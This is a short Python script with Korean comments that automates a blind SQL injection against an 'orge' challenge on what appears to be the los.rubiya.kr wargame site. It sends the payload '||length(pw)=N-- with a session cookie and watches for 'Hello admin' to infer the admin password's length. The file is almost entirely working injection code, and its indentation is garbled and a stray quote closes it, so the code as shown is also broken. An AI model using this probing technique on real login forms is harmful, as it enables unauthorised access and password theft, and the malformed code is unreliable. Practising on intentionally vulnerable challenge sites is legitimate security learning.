import urllib.request
from urllib.parse import quote

# pw 길이 1~10 사이로 예측해서 반복시킴
for i in range(1, 11, 1):

        # pw의 길이 수를 바꿔주면서 새로운 url을 만듦
            url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
                query = "'||length(pw)={}-- ".format(i)
                    query = quote(query)
                        new_url = url + query

                            # los에 로그인을 해야되서 urllib.request의 객체를 생성해 헤더를 추가해줌 
                                # 위에서 만든 새로운 url을 요청함
                                    req = urllib.request.Request(new_url)
                                        req.add_header("Cookie", "<자신의 쿠키값>")

                                            # 요청한 정보를 돌려받은 응답 저장
                                                response = urllib.request.urlopen(req)

                                                    # 서버가 응답한 데이터를 받아들이고,
                                                        # 참(admin이 있는 경우)인 경우 admin이 출력된 숫자를 표시
                                                            if str(response.read()).find("Hello admin") != -1:
                                                                        print("Find admin => {}".format(i))
                                                                            else:
                                                                                        print("{}".format(i))

                                                                                        print("Finish")"
